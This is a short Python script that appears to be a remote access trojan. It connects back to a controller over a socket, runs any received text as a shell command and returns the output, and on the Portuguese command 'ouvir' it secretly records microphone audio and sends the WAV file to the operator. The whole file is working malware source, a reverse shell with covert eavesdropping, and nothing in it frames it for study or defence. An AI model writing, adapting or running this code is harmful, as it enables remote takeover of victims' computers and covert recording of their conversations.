import sounddevice as sd
from scipy.io.wavfile import write
import os
import socket
import subprocess

class Grapiado:

    def __init__(self,ip,port):
        self.ip = ip
        self.port = port
        self.connecting(ip,port)
    def transf(self, s, path):
        if os.path.exists(path):
            f = open(path, 'rb')
            packet = f.read(9000000)
            while len(packet) > 0:
                s.send(packet)
                packet = f.read(9000000)
                s.send('DONE'.encode())


    def connecting(self,ip,port):
        s = socket.socket()
        s.connect((f"{ip}",port))
        while True:
            cmd = s.recv(1024)
            if 'exit' in cmd.decode():
                s.close()
                break

            elif 'ouvir' in cmd.decode():
                print("< INFO > - GRANPIANDO")
                fs = 64000  #freq: 4999, 64000
                seconds = 2
                recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
                sd.wait()
                write('audio_gravados/audios.wav', fs, recording)
                try:
                    self.transf(s, 'audio_gravados/audios.wav')
                 
                except:
                    pass
            else:
                CMD = subprocess.Popen(cmd.decode(),
                                       shell=True,
                                       stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE)
                s.send(CMD.stderr.read())
                s.send(CMD.stdout.read())




if __name__ == '__main__':
    try:





        Grapiado("localhost",2323)




    except Exception:
        pass
    except KeyboardInterrupt:
        pass